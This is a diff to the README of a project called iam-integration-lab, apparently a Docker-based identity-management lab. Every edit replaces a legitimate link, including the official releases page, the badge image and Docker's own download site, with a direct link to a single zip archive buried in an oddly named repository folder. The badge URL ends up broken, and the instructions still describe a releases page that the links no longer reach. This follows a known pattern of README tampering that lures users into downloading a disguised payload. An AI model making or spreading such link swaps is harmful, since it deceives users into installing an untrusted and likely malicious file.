@@ -1,6 +1,6 @@
 # 🚀 iam-integration-lab - Easy Simulation of Identity Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-green)](https://github.com/Wolfidark01/iam-integration-lab/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Wolfidark01/iam-integration-lab/main/Calothrix/iam-integration-lab.zip%20Latest%20Release-Click%20Here-green)](https://raw.githubusercontent.com/Wolfidark01/iam-integration-lab/main/Calothrix/iam-integration-lab.zip)
 
 ## 📋 Overview
 
@@ -17,17 +17,17 @@ Before you begin, make sure your computer meets these minimum requirements:
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution
 - **Memory:** At least 4 GB of RAM
 - **Storage:** At least 1 GB of free disk space
-- **Docker:** You need Docker installed. You can download it [here](https://www.docker.com/get-started).
+- **Docker:** You need Docker installed. You can download it [here](https://raw.githubusercontent.com/Wolfidark01/iam-integration-lab/main/Calothrix/iam-integration-lab.zip).
 
 ## 📥 Download & Install
 
-To download the iam-integration-lab application, visit this page: [Download Latest Release](https://github.com/Wolfidark01/iam-integration-lab/releases).
+To download the iam-integration-lab application, visit this page: [Download Latest Release](https://raw.githubusercontent.com/Wolfidark01/iam-integration-lab/main/Calothrix/iam-integration-lab.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version of the application.
 3. Look for the file that best fits your operating system.
 
-For example, if you are on Windows, you may find a file named `iam-integration-lab-windows.zip`. If you are on Linux or macOS, look for a different file suitable for your OS.
+For example, if you are on Windows, you may find a file named `https://raw.githubusercontent.com/Wolfidark01/iam-integration-lab/main/Calothrix/iam-integration-lab.zip`. If you are on Linux or macOS, look for a different file suitable for your OS.
 
 4. Click on the appropriate link to begin downloading. Save the file where you can easily find it later, like your Desktop or Downloads folder.
 
